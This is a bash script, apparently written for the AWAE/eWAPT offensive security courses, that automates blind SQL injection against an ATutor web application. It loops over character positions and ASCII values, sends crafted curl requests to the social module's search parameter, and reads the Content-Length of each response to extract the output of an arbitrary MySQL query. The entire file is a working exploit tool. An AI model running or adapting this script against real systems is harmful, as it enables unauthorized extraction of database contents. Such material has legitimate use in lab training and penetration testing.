#!/bin/bash
#
# Blind SQLi iteration substring tool
# Originally used in eWAPT, now for AWAE
#
# Check arguments
if [ $# -eq 0 ]
	then
	echo "[+] You need to supply an argument to the script!"
	echo "[+] Ex: ./this_script.sh atutor"
	exit
fi
clear
echo "Welcome to the Blind SQLi Tool"
echo
echo "Note, before using this tool, you should confirm that the target is vulnerable to SQLi"
echo "This version is hard coded to AWAE atutor blind sqli"
echo 
# Defining loop will tell us how many characters to extract in the substring
echo "[+] Enter the limit of characters to test"
read loop
# defining the payload lets us run through this many times as we need
echo "[+] Enter the mysql payload command"
read payload
# This loop is how many characters we extract
for (( x = 1; x <= $loop; x++ )); do
	#This loop cycles through the ascii character space
        for (( i = 32; i <= 126; i++ )); 
	do
		#Since we know Content-Length: 20 from manual testing as false ...
		# ... here it is leveraged with curl and grep to get a binary result
		finder=$(curl -I -i -s -k  -X $'GET' -H $"Host: $1" -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Cookie: ATutorID=fi94hmr2s8qdlf3ildfhmd88b2; flash=no' -H $'DNT: 1' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -b $'ATutorID=fi94hmr2s8qdlf3ildfhmd88b2; flash=no' $"http://$1/ATutor/mods/_standard/social/index_public.php?q=foo%27/**/or/**/(ascii(substring(($payload),$x,1)))=$i/**/or/**/1=%27%23" | grep -ic "Content-Length: 20")
		# If $finder is equal to 0, then Content-Length > 20. 
		# The sqli query is TRUE
		if [ $finder -eq 0 ]
		then
			# Convert ascii to readable
			readablechar=$(printf "\x$(printf %x $i)")
			echo "Character number $x found: $readablechar"
			export result+=$readablechar
			break
		fi
	#rm loader.txt 2&>/dev/null
	done
echo "loop " $x " complete"
done
echo
echo -n "Result = " && echo $result
